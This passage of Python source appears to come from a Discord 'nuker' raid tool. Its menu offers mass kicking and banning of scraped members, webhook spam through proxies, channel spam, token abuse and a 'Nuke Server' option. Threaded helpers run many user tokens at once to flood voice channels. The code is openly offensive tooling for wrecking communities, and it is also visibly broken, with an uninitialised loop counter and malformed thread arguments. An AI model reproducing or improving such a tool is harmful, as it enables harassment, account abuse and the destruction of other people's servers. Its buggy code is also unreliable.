                    Thread.start()

                for Thread in Threads:
                    Thread.join()
                
                break 

            except ValueError:
                print("Number of thread should only be an integer")

    def ThreadKick():
        if Constant.TOKEN is True and Constant.SERVER_ID is True:
            Members = Data.GetMember_ID()
            
            Member_1 = []
            Member_2 = []
            Member_3 = []
            Member_4 = []

            for Member in Members:
                if len(Member_1) != round(len(Members)/4):
                    Member_1.append(Member)
                
                elif len(Member_2) != round(len(Members)/4):
                    Member_2.append(Member)
                
                elif len(Member_3) != round(len(Members)/4):
                    Member_3.append(Member)
                
                elif len(Member_4) != round(len(Members)/4):
                    Member_4.append(Member)
                
                else:
                    pass
                
            while True:
                try:
                    threading.Thread(target=Discord.Kick, args=(Member_1[num])).start()
                    threading.Thread(target=Discord.Kick, args=(Member_2[num])).start()
                    threading.Thread(target=Discord.Kick, args=(Member_3[num])).start()
                    threading.Thread(target=Discord.Kick, args=(Member_4[num])).start()

                except IndexError:
                    break

                except:
                    pass

                try:
                    threading.Thread(target=Discord.Kick, args=(Member_4[num])).start()

                except IndexError:
                    break

                except:
                    pass

                num = num + 1
        
        else:
            print("")

    def ThreadBan():
        if Constant.TOKEN is True and Constant.SERVER_ID is True:
            Members = Data.GetMember_ID()
            
            Member_1 = []
            Member_2 = []
            Member_3 = []
            Member_4 = []

            for Member in Members:
                if len(Member_1) != round(len(Members)/4):
                    Member_1.append(Member)
                
                elif len(Member_2) != round(len(Members)/4):
                    Member_2.append(Member)
                
                elif len(Member_3) != round(len(Members)/4):
                    Member_3.append(Member)
                
                elif len(Member_4) != round(len(Members)/4):
                    Member_4.append(Member)
                
                else:
                    pass
            
            while num > round(len(Members/4)):
                try:
                    threading.Thread(target=Discord.Ban, args=(Member_1[num])).start()
                    threading.Thread(target=Discord.Ban, args=(Member_2[num])).start()
                    threading.Thread(target=Discord.Ban, args=(Member_3[num])).start()
                    threading.Thread(target=Discord.Ban, args=(Member_4[num])).start()
                    num = num + 1

                except IndexError:
                    break

                except:
                    pass 
        
        else:
            print("")


    def ThreadLivestream():
        if not Constant.SERVER_ID is True:

            VOICE_ID = input(f"{Colour.YELLOW}                        Voice channel ID : ")
            threads_create = [] 
            with ThreadPoolExecutor(max_workers=len(Constant.TOKENS)) as executor:
                for token in Constant.TOKENS:
                    threads_create.append(executor.submit(Discord.Livestream,token,VOICE_ID))
        
        else:
            print("")
    
    def ThreadConnect():
        if not Constant.SERVER_ID is True:

            VOICE_ID = input("                        Voice channel ID : ")
            threads_create = [] 
            with ThreadPoolExecutor(max_workers=len(Constant.TOKENS)) as executor:
                for token in Constant.TOKENS:
                    threads_create.append(executor.submit(Discord.Connect,token,VOICE_ID))

        else:
            pass

    def ThreadOnline():
        if not Constant.SERVER_ID is True:
            threads_create = [] 
            with ThreadPoolExecutor(max_workers=len(Constant.TOKENS)) as executor:
                for token in Constant.TOKENS:
                    threads_create.append(executor.submit(Discord.Online,token))
        else:
            print("")

class Main:

    NEEDPROXY = [9]
    FunctionDict = {
        1: [ThreadFunction.Channel_ID,"Scrape Channels"], 
        2: [ThreadFunction.Member_ID,"Scrape Members"],
        3: [ThreadFunction.Role_ID,"Scrape Roles"], 
        4: [ThreadFunction.ThreadKick,"Kick"],
        5: [ThreadFunction.ThreadBan,"Ban"],
        6: [Discord.Join,"Join"],
        7: [Discord.Leave,"Leave"], 
        8: [Discord.CreateWebhook,"Create Webhook"],
        9: [ThreadFunction.ThreadSpamWebhook,"Spam Webhook"],
        10: [ThreadFunction.ThreadConnect,"Connect"], 
        11: [ThreadFunction.ThreadOnline,"Online"],
        12: [ThreadFunction.ThreadLivestream,"Livestream"],
        13: [Discord.CreateChannel,"Create Channels"],
        14: [Discord.DeleteChannel,"Delete Channels"],
        15: [Discord.ChangeChannelName,"Channel Name"],
        16: [Discord.CreateCategory,"Create Category"],
        17: [Discord.DeleteCategory,"Delete Category"],
        18: [Discord.ChangeCategoryName,"Category Name"],
        19: [Discord.CreateVoiceChannel,"Create Voice"],
        20: [Discord.DeleteVoiceChannel,"Delete Voice"],
        21: [Discord.ChangeVoiceName,"Change Voice"],
        22: [Discord.CreateRole,"Create Role"],
        23: [Discord.DeleteRole,"Delete Role"],
        24: [Discord.ChangeRoleName,"Change Role"],
        25: ["","Change Nickname"],
        26: ["","Server Name"],
        27: ["","Server Picture"],
        28: ["","Spam Channel"],
        29: ["","Token Fuck"],
        30: ["","Login Token"],
        31: ["","Nuke Server"],
        32: [exit,"Exit"]
    }
    def CallFunction(Proxy):
        print("hi")

    def run(Proxy= None, Getproxy = True):
        if Function.CheckInternet() is True:
            Function.DiscordRPC()
            Function.Clear()
            Function.Menu()
            Stat , Respond =Update.CheckUpdate(Constant.CheckForUpdate)
            if Stat == "UPDATE" and Respond.upper() in ["Y","YES"]:
                Update.UpdateProgram()
            
            else:
                Function.Clear()
                Function.Menu()
                if Getproxy == False or Proxy is None:
                    Proxy = ProxyIP.GetProxies()
                while True:
                    try:    
                        Choice = int(input(f"                   {Colour.YELLOW}ROOT{Colour.WHITE}@{Colour.YELLOW}REACT>> "))
                        if Choice in Main.NEEDPROXY:
                            Main.FunctionDict[Choice](Proxy)
                        
                        else:
                            Main.FunctionDict[Choice][0]()

                        if input("CONTINUE ? [ Y/N ] ").upper() in ["Y","YES"]:
                            Main.run(Proxy)
                            break
                        
                        else:
                            Main.FunctionDict[32]()
                    
                    except (ValueError, KeyError):
                        Status.Fail(f"Invalid choice")

        else:
            Function.Clear()
            print("No Internet Connection")

def start(START=False):
    if START is True:
        Function.Spinner()
        try:
            Main.run()
        except Exception as e:
            print(e)
    else:
        print("sss")

start(Constant.START)
